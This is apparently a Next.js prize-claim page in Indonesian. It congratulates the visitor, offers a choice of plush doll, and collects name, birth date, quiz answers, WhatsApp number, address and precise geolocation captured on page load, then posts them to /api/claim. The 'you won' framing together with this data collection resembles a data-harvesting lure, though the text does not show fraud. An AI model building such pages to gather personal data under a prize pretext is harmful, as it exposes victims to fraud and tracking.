"use client";

import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";

const DOLLS = [
  { id: "pooh",  name: "Pooh",  img: "/dolls/pooh.jpg" },
  { id: "berry", name: "Berry", img: "/dolls/berry.jpg" },
  { id: "dolpi", name: "Dolpi", img: "/dolls/dolpi.jpg" },
  { id: "hazel", name: "Hazel", img: "/dolls/hazel.jpg" },
  { id: "rusty", name: "Rusty", img: "/dolls/rusty.jpg" },
  { id: "minty", name: "Minty", img: "/dolls/minty.jpg" },
  { id: "honey", name: "Honey", img: "/dolls/honey.jpg" },
];

function ClaimForm() {
  const router = useRouter();
  const params = useSearchParams();

  const name = params.get("name") || "";
  const birthDate = params.get("birth_date") || "";
  const prize = params.get("prize") || "";
  const a1 = params.get("a1") || "";
  const a2 = params.get("a2") || "";
  const a3 = params.get("a3") || "";

  const [phone, setPhone] = useState("");
  const [address, setAddress] = useState("");
  const [dollChoice, setDollChoice] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null);
  const [locStatus, setLocStatus] = useState<"idle" | "granted" | "denied">("idle");

  useEffect(() => {
    if (!navigator.geolocation) {
      setLocStatus("denied");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
        setLocStatus("granted");
      },
      () => setLocStatus("denied")
    );
  }, []);

  const handleSubmit = async () => {
    if (!phone || !address || !dollChoice) {
      setError("Semua field wajib diisi, termasuk pilihan boneka.");
      return;
    }

    setLoading(true);
    setError("");

    const res = await fetch("/api/claim", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name,
        birth_date: birthDate,
        prize,
        phone,
        address,
        answer_1: a1,
        answer_2: a2,
        answer_3: a3,
        latitude: location?.lat || null,
        longitude: location?.lng || null,
        doll_choice: dollChoice,
      }),
    });

    const data = await res.json();
    setLoading(false);

    if (data.success) {
      router.push("/success");
    } else {
      setError("Terjadi kesalahan. Coba lagi.");
    }
  };

  return (
    <main className="min-h-screen bg-[#F0F4FF] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-sm">

        <div className="flex items-center gap-2 mb-6">
          <div className="w-1.5 h-1.5 bg-blue-300 rounded-full" />
          <div className="w-1.5 h-1.5 bg-blue-300 rounded-full" />
          <div className="w-5 h-1.5 bg-blue-600 rounded-full" />
        </div>

        <div className="inline-flex items-center gap-2 bg-green-100 border border-green-200 rounded-xl px-3 py-1.5 mb-4">
          <span className="text-xs font-semibold text-green-600 uppercase tracking-widest">🏆 Kamu menang!</span>
        </div>

        <h1 className="text-3xl font-serif text-gray-900 mb-1">
          Klaim hadiahmu
        </h1>
        <p className="text-sm text-gray-400 mb-6">
          Lengkapi data untuk pengiriman hadiah
        </p>

        <div className="flex flex-col gap-4">

          {/* Doll picker */}
          <div>
            <label className="text-[10px] font-semibold text-blue-600 uppercase tracking-widest mb-2 block">
              Pilih Boneka
            </label>
            <div className="grid grid-cols-4 gap-2">
              {DOLLS.map((doll) => (
                <button
                  key={doll.id}
                  onClick={() => setDollChoice(doll.id)}
                  className={`flex flex-col items-center gap-1 p-2 rounded-2xl border-2 transition-all ${
                    dollChoice === doll.id
                      ? "border-blue-500 bg-blue-50"
                      : "border-gray-100 bg-white"
                  }`}
                >
                  <div className="w-full aspect-square rounded-xl overflow-hidden relative">
                    <Image
                      src={doll.img}
                      alt={doll.name}
                      fill
                      className="object-cover"
                    />
                  </div>
                  <span className="text-[10px] font-medium text-gray-700">{doll.name}</span>
                </button>
              ))}
            </div>
            {dollChoice && (() => {
  const selected = DOLLS.find((d) => d.id === dollChoice)!;
  return (
    <div className="bg-white border border-blue-100 rounded-2xl p-4 flex flex-col items-center gap-3">
      <div className="relative w-64 h-64 rounded-xl overflow-hidden">
        <Image src={selected.img} alt={selected.name} fill className="object-cover" />
      </div>
      <div className="text-center">
        <p className="text-[10px] text-gray-400 uppercase tracking-widest mb-0.5">Pilihanmu</p>
        <p className="text-base font-semibold text-gray-900">{selected.name}</p>
        <p className="text-xs text-blue-500 mt-1">✓ Boneka ini yang akan dikirim</p>
      </div>
    </div>
  );
})()}
          </div>

          <div>
            <label className="text-[10px] font-semibold text-blue-600 uppercase tracking-widest mb-1.5 block">
              Nomor WhatsApp
            </label>
            <input
              type="number"
              placeholder="0812-3456-7890"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full bg-white border border-gray-200 rounded-2xl px-4 py-3.5 text-sm text-gray-800 placeholder-gray-300 outline-none focus:border-blue-500 transition-colors"
            />
          </div>

          <div>
            <label className="text-[10px] font-semibold text-blue-600 uppercase tracking-widest mb-1.5 block">
              Alamat Pengiriman
            </label>
            <textarea
              placeholder="Jl. Contoh No. 1, Kelurahan, Kecamatan, Kota..."
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              rows={3}
              className="w-full bg-white border border-gray-200 rounded-2xl px-4 py-3.5 text-sm text-gray-800 placeholder-gray-300 outline-none focus:border-blue-500 transition-colors resize-none"
            />
          </div>

          <div className={`rounded-2xl p-4 flex items-center gap-3 border ${
            locStatus === "granted" ? "bg-green-50 border-green-200" :
            locStatus === "denied" ? "bg-red-50 border-red-100" :
            "bg-white border-gray-200"
          }`}>
            <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-xl flex-shrink-0 ${
              locStatus === "granted" ? "bg-green-100" :
              locStatus === "denied" ? "bg-red-100" : "bg-blue-50"
            }`}>
              {locStatus === "granted" ? "📍" : locStatus === "denied" ? "🚫" : "📡"}
            </div>
            <div>
              <p className="text-xs font-medium text-gray-800">
                {locStatus === "granted" ? "Lokasi terdeteksi" :
                 locStatus === "denied" ? "Lokasi tidak dibagikan" :
                 "Mendeteksi lokasi..."}
              </p>
              <p className={`text-[10px] mt-0.5 ${
                locStatus === "granted" ? "text-green-500" :
                locStatus === "denied" ? "text-red-400" : "text-gray-400"
              }`}>
                {locStatus === "granted"
                  ? `${location?.lat.toFixed(4)}°, ${location?.lng.toFixed(4)}°`
                  : locStatus === "denied"
                  ? "Kamu menolak izin lokasi"
                  : "Mohon izinkan akses lokasi browser"}
              </p>
            </div>
          </div>

          {error && (
            <p className="text-xs text-red-500 text-center">{error}</p>
          )}

          <button
            onClick={handleSubmit}
            disabled={loading}
            className="w-full bg-blue-600 text-white rounded-2xl py-4 text-sm font-medium hover:bg-blue-700 transition-colors disabled:opacity-50 mt-2"
          >
            {loading ? "Mengirim..." : "Kirim Klaim Hadiah →"}
          </button>

        </div>
      </div>
    </main>
  );
}

export default function ClaimPage() {
  return (
    <Suspense>
      <ClaimForm />
    </Suspense>
  );
}